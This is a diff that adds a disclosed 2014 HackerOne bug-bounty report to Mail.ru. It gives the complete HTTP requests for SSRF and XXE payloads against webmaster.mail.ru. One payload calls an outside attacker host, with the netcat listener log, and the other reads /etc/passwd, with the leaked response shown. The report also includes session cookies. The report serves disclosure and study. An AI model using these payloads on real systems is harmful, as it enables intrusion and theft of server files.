@@ -1,0 +1,78 @@
+ReportLink:https://hackerone.com/reports/12583
+WeaknessName:Command Injection - Generic
+Reporter:https://hackerone.com/4lemon
+ReportedTo:Mail.ru(mailru)
+BountyAmount:700.0
+Severity:
+State:Closed
+DateOfDisclosure:10.12.2014 19:09:45
+
+Summary:
+
+SSRF request:
+POST /domain/metadata HTTP/1.1
+Host: webmaster.mail.ru
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:29.0) Gecko/20100101 Firefox/29.0
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Referer: http://webmaster.mail.ru/domain/
+Content-Length: 909
+Cookie: p=fwoAANHmmQAA; mrcu=3BE3537A7E507ED9608843B61205; VID=0DDvyr1ZZvnD:; i=AQBZfnpTAQBdAAUCAQA=; b=UT8AADCX/QcAPgAAgh828AAA; s=fver=13; mc1=1400536667; Mpop=1400536671:7e796b525c546e5419050219081d000c1c0600054966535c465d020101000716037572164e505844545f54435444505e4d105d57515e1c4a4c:whitehataudit@mail.ru:; t=obLD1AAAAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAQAAACAAAEBvAcA; wmus=c9cac4666004e6dadcf235cff3a6a3669a418896
+Connection: keep-alive
+Pragma: no-cache
+Cache-Control: no-cache
+
+sitemap_urls=&fullname=fulltitle'%22%3E%3Ca%3EasdF%3C%2FA%3E&sitelinks-title=title'%22%3E%3Ca%3EasdF%3C%2FA%3E&sitelinks-url=%2Fasdfasdf&meta-adress-country=country'%22%3E%3Ca%3EasdF%3C%2FA%3E&meta-adress-region=region'%22%3E%3Ca%3EasdF%3C%2FA%3E&meta-adress-city=city'%22%3E%3Ca%3EasdF%3C%2FA%3E&meta-adress-adress=addr'%22%3E%3Ca%3EasdF%3C%2FA%3E&meta-adress-code-c=&meta-adress-code-r=&meta-adress-phone=&sitelinks_xml=<!DOCTYPE aaa SYSTEM  "http://95.211.198.76:6666/xxe.xml"> <site><name><![CDATA[fulltitle'"><a>asdF</A>]]></name><sitelinks><sitelink title="title" url="http://simple-semiconductors.com/asdfasdf" /></sitelinks><addresses><address><addressLocality>city%26foo%3b</addressLocality><addressCountry>country </addressCountry><addressRegion>region</addressRegion><streetAddress>addr</streetAddress></address></addresses></site>&id=481265&site_url=simple-semiconductors.com&sitemap_url_errors=-1
+
+payload:
+<!DOCTYPE aaa SYSTEM  "http://95.211.198.76:6666/xxe.xml"> 
+
+on server side:
+nc -vvv -l 6666
+Connection from 217.69.133.45 port 6666 [tcp/ircu-2] accepted
+GET /xxe.xml HTTP/1.0
+Host: 95.211.198.76:6666
+Accept-Encoding: gzip
+
+ping webmaster.mail.ru
+PING webmaster.mail.ru (217.69.133.45) 56(84) bytes of data.
+
+Запрос идёт с сервера webmaster.mail.ru. Соответственно, в контексте этого сервера возможны вектора SSRF. Всё это хорошо описано в https://docs.google.com/document/d/1v1TkWZtrhzRLy0bYXBcdLUedXGb9njTNIJXa3u9akHM/edit
+
+XXE request:
+POST /domain/metadata HTTP/1.1
+Host: webmaster.mail.ru
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:29.0) Gecko/20100101 Firefox/29.0
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Referer: http://webmaster.mail.ru/domain/
+Content-Length: 929
+Cookie: p=fwoAANHmmQAA; mrcu=3BE3537A7E507ED9608843B61205; VID=0DDvyr1ZZvnD:; i=AQBZfnpTAQBdAAUCAQA=; b=UT8AADCX/QcAPgAAgh828AAA; s=fver=13; mc1=1400536667; Mpop=1400536671:7e796b525c546e5419050219081d000c1c0600054966535c465d020101000716037572164e505844545f54435444505e4d105d57515e1c4a4c:whitehataudit@mail.ru:; t=obLD1AAAAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAQAAACAAAEBvAcA; wmus=c9cac4666004e6dadcf235cff3a6a3669a418896
+Connection: keep-alive
+Pragma: no-cache
+Cache-Control: no-cache
+
+sitemap_urls=&fullname=fulltitle'%22%3E%3Ca%3EasdF%3C%2FA%3E&sitelinks-title=title'%22%3E%3Ca%3EasdF%3C%2FA%3E&sitelinks-url=%2Fasdfasdf&meta-adress-country=country'%22%3E%3Ca%3EasdF%3C%2FA%3E&meta-adress-region=region'%22%3E%3Ca%3EasdF%3C%2FA%3E&meta-adress-city=city'%22%3E%3Ca%3EasdF%3C%2FA%3E&meta-adress-adress=addr'%22%3E%3Ca%3EasdF%3C%2FA%3E&meta-adress-code-c=&meta-adress-code-r=&meta-adress-phone=&sitelinks_xml=<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY foo SYSTEM "file:///etc/passwd" >]> <site><name><![CDATA[fulltitle'"><a>asdF</A>]]></name><sitelinks><sitelink title="title" url="http://simple-semiconductors.com/asdfasdf" /></sitelinks><addresses><address><addressLocality>city%26foo%3b</addressLocality><addressCountry>country </addressCountry><addressRegion>region</addressRegion><streetAddress>addr</streetAddress></address></addresses></site>&id=481265&site_url=simple-semiconductors.com&sitemap_url_errors=-1
+
+payload:
+<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY foo SYSTEM "file:///etc/passwd" >]> <site><name><![CDATA[fulltitle'"><a>asdF</A>]]></name><sitelinks><sitelink title="title" url="http://simple-semiconductors.com/asdfasdf" /></sitelinks><addresses><address><addressLocality>%26foo%3b</addressLocality><addressCountry>country </addressCountry><addressRegion>region</addressRegion><streetAddress>addr</streetAddress></address></addresses></site>
+
+response:
+HTTP/1.1 200 OK
+Server: nginx
+Date: Tue, 20 May 2014 01:00:28 GMT
+Content-Type: application/json; charset=utf-8
+Content-Length: 129
+Connection: keep-alive
+Keep-Alive: timeout=20
+Set-Cookie: wmus=c9cac4666004e6dadcf235cff3a6a3669a418896; path=/; expires=Sat, 19-Jul-2014 01:00:28 GMT; HttpOnly
+
+{"xml_error":true,"error":"Element 'addressLocality': [facet 'pattern'] The value 'root:x:0:0:root:/root:/bin/bash","line":1}
+
+Тут по-хорошему надо поиграться с XSD, чтобы вывод был полный, но шлю сразу. Если будут добавления - пришлю ещё.
